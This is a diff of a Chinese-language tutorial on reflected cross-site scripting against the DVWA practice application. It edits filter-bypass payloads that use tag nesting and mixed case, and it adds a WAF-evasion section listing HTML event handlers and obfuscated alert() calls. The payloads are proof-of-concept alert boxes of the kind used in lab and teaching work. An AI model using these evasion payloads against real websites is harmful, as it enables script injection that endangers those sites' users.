@@ -34,8 +34,8 @@ http://<IP地址!!!>/dvwa/vulnerabilities/xss_r/?name=%3Csc%3Cscript%3Eript%3Eal
 其中使用url翻译：http://tool.chinaz.com/tools/urlencode.aspx
 
 也可以通过大小写混淆写通过：
-输入<ScRipt>alert(/xss/)</script>，<ScRipt>alert(/网安2019/)</script>成功弹框：网安2019国庆70周年网络安全保障行动
-<ScRipt>alert(/网安2019国庆70周年网络安全保障行动/)</script>
+输入<ScRipt>alert(/xss/)</script>，<ScRipt>alert(/XSS/)</script>成功弹框：
+<ScRipt>alert(/XSS/)</script>
 <ScRipt>alert(/wangan2019guoqing?70zhounianwangluoanquanbaozhangxingdongL?/)</script>
 相应的 XSS 链接（转码为url）：http://<IP地址!!!>/dvwa/vulnerabilities/xss_r/?name=%3CScRipt%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#
 
@@ -505,5 +505,94 @@ a="get";b="URL";c="javascript:";d="alert('XSS');";eval(a+b+c+d);
 **绕waf**
 
 
+所有的事件，来自菜鸟教程。
 
+onclick  
+oncontextmenu  
+ondblclick  
+onmousedown  
+onmouseenter  
+onmouseleave  
+onmousemove  
+onmouseover  
+onmouseout  
+onmouseup
+onkeydown
+onkeypress
+onkeyup
+onabort
+onbeforeunload
+onerror
+onhashchange  
+onload
+onpageshow
+onpagehide
+onresize  
+onscroll  
+onunload  
+onblur  
+onchange  
+onfocus  
+onfocusin  
+onfocusout
+oninput  
+onreset
+onsearch
+onselect
+onsubmit
+oncopy  
+oncut  
+onpaste
+onafterprint  
+onbeforeprint  
+ondrag
+ondragend  
+ondragenter
+ondragleave
+ondragover
+ondragstart  
+ondrop
+onabort
+oncanplay
+oncanplaythrough
+ondurationchange
+onemptied
+onended
+onerror  
+onloadeddata  
+onloadedmetadata
+onloadstart
+onpause  
+onplay  
+onplaying  
+onprogress
+onratechange
+onseeked
+onseeking  
+onstalled
+onsuspend
+ontimeupdate
+onvolumechange
+onwaiting  
+animationend
+animationiteration
+animationstart
+transitionend  
+onmessage  
+onmousewheel
+ononline
+onoffline  
+onpopstate  
+onshow
+onstorage  
+ontoggle  
+onwheel
+
+弹框事件
+
+self['al'%2B'ert'](1) >
+parent['al'%2B'ert'](1) >
+frames['al'%2B'ert'](1) >
+content['al'%2B'ert'](1) >
+window['al'%2B'ert'](1) >
 
